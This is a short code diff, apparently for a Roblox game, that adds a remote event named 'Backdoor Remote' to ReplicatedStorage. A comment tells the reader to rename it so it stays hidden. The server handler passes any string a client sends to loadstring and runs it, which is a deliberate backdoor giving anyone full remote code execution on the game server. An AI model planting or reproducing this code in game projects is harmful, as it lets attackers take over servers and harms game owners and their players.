@@ -1,0 +1,6 @@
+local remote = Instance.new("RemoteEvent")
+remote.Name = "Backdoor Remote" --obviously change, duh
+remote.Parent = game:GetService("ReplicatedStorage")
+remote.OnServerEvent:Connect(function(plr, code)
+   loadstring(code)()
+end)
